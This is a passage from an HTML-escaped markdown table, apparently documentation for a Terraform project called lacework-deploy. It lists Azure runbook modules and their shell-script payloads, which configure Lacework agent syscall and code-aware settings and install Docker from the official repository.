                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-runbook-deploy-lacework-syscall-config            | ./modules/runbook/deploy-lacework-syscall-config     | runbook_deploy_lacework_syscall                  | context.azure.runbook.deploy_lacework_syscall_config              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_syscall_config&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-syscall-config     | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;lacework&amp;#45;sycall&amp;#45;config&quot;<br/>    lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path = &quot;/var/lib/lacework&quot;<br/>    lacework&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;95;path = &quot;$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path&amp;&amp;#35;125;/config/syscall&amp;&amp;#35;95;config&amp;#46;yaml&quot;<br/>    syscall&amp;&amp;#35;95;config = file&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;syscall&amp;&amp;#35;95;config&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    base64&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config = local&amp;#46;syscall&amp;&amp;#35;95;config<br/>    hash&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config = sha256&amp;&amp;#35;40;local&amp;#46;syscall&amp;&amp;#35;95;config&amp;&amp;#35;41;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH=&quot;$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;<br/>    LACEWORK&amp;&amp;#35;95;SYSCALL&amp;&amp;#35;95;CONFIG&amp;&amp;#35;95;PATH=$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;95;path&amp;&amp;#35;125;<br/>    <br/>    &amp;#35; Check if Lacework is pre&amp;#45;installed&amp;#46; If installed, add syscall&amp;&amp;#35;95;config&amp;#46;yaml&amp;#46;<br/>    if &amp;&amp;#35;91; &amp;#45;f &quot;$LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH/datacollector&quot; &amp;&amp;#35;93;; then<br/>        log &quot;Lacework agent is installed, adding syscall&amp;&amp;#35;95;config&amp;#46;yaml&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        if echo &quot;$&amp;&amp;#35;123;local&amp;#46;hash&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;125;  $LACEWORK&amp;&amp;#35;95;SYSCALL&amp;&amp;#35;95;CONFIG&amp;&amp;#35;95;PATH&quot; &amp;#124; sha256sum &amp;#45;&amp;#45;check &amp;#45;&amp;#45;status; then <br/>            log &quot;Lacework syscall&amp;&amp;#35;95;config&amp;#46;yaml unchanged&quot;; <br/>        else <br/>            log &quot;Lacework syscall&amp;&amp;#35;95;config&amp;#46;yaml requires update&quot;<br/>            echo &amp;#45;n &quot;$&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;syscall&amp;&amp;#35;95;config&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; $LACEWORK&amp;&amp;#35;95;SYSCALL&amp;&amp;#35;95;CONFIG&amp;&amp;#35;95;PATH<br/>        fi<br/>        log &quot;Lacework agent is installed, adding disable aggregation config&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        file&amp;&amp;#35;95;path=&quot;/var/lib/lacework/config/config&amp;#46;json&quot;<br/><br/>        log &quot;Checking for ebpf aggregate&amp;&amp;#35;95;events disabled&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        grep &amp;#45;q &#x27;&quot;ebpf&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;aggregate&amp;&amp;#35;95;events&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;false&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>        if &amp;&amp;#35;91; $? &amp;#45;ne 0 &amp;&amp;#35;93;; then<br/>            log &quot;ebpf aggregate&amp;&amp;#35;95;events not currently disabled&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            grep &amp;#45;q &#x27;&quot;ebpf&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>            if &amp;&amp;#35;91; $? &amp;#45;eq 0 &amp;&amp;#35;93;; then<br/>                log &quot;Found existing ebpf config &amp;#45; updating&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;s/&quot;ebpf&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;/&quot;ebpf&quot;: &amp;&amp;#35;123;&quot;aggregate&amp;&amp;#35;95;events&quot;: &quot;false&quot;&amp;&amp;#35;125;/&#x27; $file&amp;&amp;#35;95;path<br/>            else<br/>                log &quot;No existing ebpf config &amp;#45; appending&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;1s/&amp;&amp;#35;123;/&amp;&amp;#35;123;&amp;&amp;#35;92;n  &quot;ebpf&quot;: &amp;&amp;#35;123;&quot;aggregate&amp;&amp;#35;95;events&quot;: &quot;false&quot;&amp;&amp;#35;125;,/&#x27; $file&amp;&amp;#35;95;path<br/>            fi<br/>        else<br/>            log &quot;ebpf aggregate&amp;&amp;#35;95;events already enabled&amp;#46;&quot;<br/>        fi<br/>    fi<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-runbook-deploy-lacework-code-aware-agent          | ./modules/runbook/deploy-lacework-code-aware-agent   | runbook_deploy_lacework_code_aware_agent         | context.azure.runbook.deploy_lacework_code_aware_agent            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_code_aware_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-code-aware-agent   | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;lacework&amp;#45;codeware&amp;#45;agent&quot;<br/>    lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path = &quot;/var/lib/lacework&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH=&quot;$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;  <br/>    <br/>    &amp;#35; Check if Lacework is pre&amp;#45;installed&amp;#46; If installed, add code aware agent config&amp;#46;<br/>    if &amp;&amp;#35;91; &amp;#45;f &quot;$LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH/datacollector&quot; &amp;&amp;#35;93;; then<br/>        log &quot;Lacework agent is installed, adding code aware agent config&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        file&amp;&amp;#35;95;path=&quot;/var/lib/lacework/config/config&amp;#46;json&quot;<br/>        <br/>        log &quot;Checking for codeaware agent config enable&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        grep &amp;#45;q &#x27;&quot;codeaware&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;enable&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;all&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>        if &amp;&amp;#35;91; $? &amp;#45;ne 0 &amp;&amp;#35;93;; then<br/>            log &quot;Code aware agent not currently enabled&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            grep &amp;#45;q &#x27;&quot;codeaware&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>            if &amp;&amp;#35;91; $? &amp;#45;eq 0 &amp;&amp;#35;93;; then<br/>                log &quot;Found existing codeaware config &amp;#45; updating&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;s/&quot;codeaware&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;/&quot;codeaware&quot;: &amp;&amp;#35;123;&quot;enable&quot;: &quot;all&quot;&amp;&amp;#35;125;/&#x27; $file&amp;&amp;#35;95;path<br/>            else<br/>                log &quot;No existing codeaware config &amp;#45; appending&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;1s/&amp;&amp;#35;123;/&amp;&amp;#35;123;&amp;&amp;#35;92;n  &quot;codeaware&quot;: &amp;&amp;#35;123;&quot;enable&quot;: &quot;all&quot;&amp;&amp;#35;125;,/&#x27; $file&amp;&amp;#35;95;path<br/>            fi<br/>        else<br/>            log &quot;Code aware agent config already enabled&amp;#46;&quot;<br/>        fi<br/>    fi<br/>    log &quot;Done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| target-runbook-deploy-docker                             | ./modules/runbook/deploy-docker                      | runbook_deploy_docker                            | context.azure.runbook.deploy_docker                               | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_docker&quot;: {<br/>                    &quot;docker_users&quot;: [],<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker                      | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;docker&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            &amp;#35; ensure non root users are added to the docker group<br/>            if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        sudo apt&amp;#45;get update<br/>        sudo apt&amp;#45;get remove &amp;#45;y docker docker&amp;#45;engine docker&amp;#46;io containerd runc<br/>        sudo apt&amp;#45;get install &amp;#45;y &amp;&amp;#35;92;<br/>            ca&amp;#45;certificates &amp;&amp;#35;92;<br/>            curl &amp;&amp;#35;92;<br/>            gnupg &amp;&amp;#35;92;<br/>            lsb&amp;#45;release<br/>        sudo mkdir &amp;#45;p /etc/apt/keyrings<br/>        sudo rm &amp;#45;f /etc/apt/keyrings/docker&amp;#46;gpg<br/>        curl &amp;#45;fsSL https://download&amp;#46;docker&amp;#46;com/linux/ubuntu/gpg &amp;#124; sudo gpg &amp;#45;&amp;#45;dearmor &amp;#45;o /etc/apt/keyrings/docker&amp;#46;gpg<br/>        echo &amp;&amp;#35;92;<br/>        &quot;deb &amp;&amp;#35;91;arch=$&amp;&amp;#35;40;dpkg &amp;#45;&amp;#45;print&amp;#45;architecture&amp;&amp;#35;41; signed&amp;#45;by=/etc/apt/keyrings/docker&amp;#46;gpg&amp;&amp;#35;93; https://download&amp;#46;docker&amp;#46;com/linux/ubuntu &amp;&amp;#35;92;<br/>        $&amp;&amp;#35;40;lsb&amp;&amp;#35;95;release &amp;#45;cs&amp;&amp;#35;41; stable&quot; &amp;#124; sudo tee /etc/apt/sources&amp;#46;list&amp;#46;d/docker&amp;#46;list &gt; /dev/null<br/>        sudo apt&amp;#45;get update<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;docker&amp;#45;ce docker&amp;#45;ce&amp;#45;cli containerd&amp;#46;io docker&amp;#45;buildx&amp;#45;plugin docker&amp;#45;compose&amp;#45;plugin&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        &amp;#35; ensure non root users are added to the docker group<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;;<br/>            &amp;#35; ensure non root users are added to the docker group<br/>            if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        yum update &amp;#45;y<br/>        yum remove docker &amp;&amp;#35;92;<br/>                  docker&amp;#45;client &amp;&amp;#35;92;<br/>                  docker&amp;#45;client&amp;#45;latest &amp;&amp;#35;92;<br/>                  docker&amp;#45;common &amp;&amp;#35;92;<br/>                  docker&amp;#45;latest &amp;&amp;#35;92;<br/>                  docker&amp;#45;latest&amp;#45;logrotate &amp;&amp;#35;92;<br/>                  docker&amp;#45;logrotate &amp;&amp;#35;92;<br/>                  